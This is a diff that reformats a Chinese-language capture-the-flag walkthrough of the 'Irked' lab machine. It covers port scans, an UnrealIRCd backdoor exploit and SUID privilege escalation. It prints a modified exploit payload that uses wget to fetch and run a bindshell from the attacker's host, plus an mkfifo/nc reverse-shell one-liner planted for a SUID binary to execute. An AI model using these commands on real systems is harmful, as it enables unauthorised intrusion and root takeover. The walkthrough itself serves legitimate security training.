@@ -1,11 +1,6 @@
+## nmap
 
-irked - 我来 Wolai
-
-
-
-
-irked
-nmap
+```Bash
 PORT      STATE SERVICE
 22/tcp    open  ssh
 80/tcp    open  http
@@ -14,7 +9,12 @@ PORT      STATE SERVICE
 8067/tcp  open  infi-async
 40791/tcp open  unknown
 65534/tcp open  unknown
+
+```
+
  
+
+```Bash
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
 | ssh-hostkey:
@@ -41,24 +41,54 @@ PORT      STATE SERVICE VERSION
 40791/tcp open  status  1 (RPC #100024)
 65534/tcp open  irc     UnrealIRCd
 Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
 注意这里有个域名  irked.htb
-ssh
+
+## ssh
+
 ssh版本低，且使用了不安全算法，没有对应的exp
-http
+
+
+
+## http
+
 主页打开有一张图片，分析后没有发现异常
+
+```Bash
 └─# curl http://10.10.10.117/
 <img src=irked.jpg>
 <br>
 <b><center>IRC is almost working!</b></center>
+
+```
+
 提示中有IRC 和上面的扫描结果有关联
+
+
+
 目录爆破
+
 manual页面是apcache的帮助文档页面，用处不大
-IRC
+
+
+
+## IRC
+
 irc是什么？  
-What is IRC (Internet Relay Chat)? (computerhope.com)
+
+[What is IRC (Internet Relay Chat)? (computerhope.com)](https://www.computerhope.com/jargon/i/irc.htm#:~:text=Developed in August 1988, by Jarkko Oikarinen, IRC,web service and communicate with each other live.)
+
 看上去是一款古老的协议
-manual - 失败
+
+
+
+### manual - 失败
+
 UnrealIrcd是什么
+
+```Bash
 └─# searchsploit  unrealirc
 -------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                      |  Path
@@ -67,20 +97,50 @@ UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                    
 UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                             | windows/dos/18011.txt
 UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                      | linux/remote/13853.pl
 UnrealIRCd 3.x - Remote Denial of Service                                                                           | windows/dos/27407.pl
-Authentication types - UnrealIRCd documentation wiki
+```
+
+[Authentication types - UnrealIRCd documentation wiki](https://www.unrealircd.org/docs/Authentication_types)
+
 使用13853.pl，将其中的playload修改成自己的反弹shell，没有成功，看了下原始的shell都是从远端服务器下载到本地后执行，尝试在kali上起web服务提供shell下载
+
+```Bash
 my $payload2 = 'AB; cd /tmp; wget http://10.10.16.11/bindshell -O bot; chmod +x bot; ./bot &';
+
+```
+
 但是没有触发下载
-msf
+
+
+
+### msf
+
 通过msf拿到一个低权shell ircd，存在另外一个用户 djmardov，存在user.txt 但是没有权限
-NSE脚本（没有考虑到）
+
+
+
+### NSE脚本（没有考虑到）
+
+```Python
 └─# locate   *.nse | grep  unreal
 /usr/share/nmap/scripts/irc-unrealircd-backdoor.nse
-Privilege Escalation
-ircd → djmardov
+
+```
+
+
+
+## Privilege Escalation
+
+### ircd → djmardov
+
 没有sudo
+
 使用pspy看下定时进程，LinEnum.sh 都没有特别发现
+
+
+
 看下题解
+
+```Python
 ircd@irked:/usr/bin$ find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -113,7 +173,12 @@ It is still being actively developed
 (unknown) :0           2023-02-05 07:14 (:0)
 sh: 1: /tmp/listusers: not found
 ircd@irked:/usr/bin$
+
+```
+
 有个SUID的敏感文件，执行后有shell文件执行报错没有找到文件，在目录下新建一个同名文件，内容为反弹shell，拿到root权限
+
+```Python
 ircd@irked:/usr/bin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 9001 >/tmp/f" > /tmp/listusers
 <t /tmp/f|sh -i 2>&1|nc 10.10.16.11 9001 >/tmp/f" > /tmp/listusers
 ircd@irked:/usr/bin$
@@ -135,5 +200,9 @@ ircd@irked:/usr/bin$ ./viewuser
 This application is being devleoped to set and test user permissions
 It is still being actively developed
 (unknown) :0           2023-02-05 07:14 (:0)
+
+
+```
+
 
 
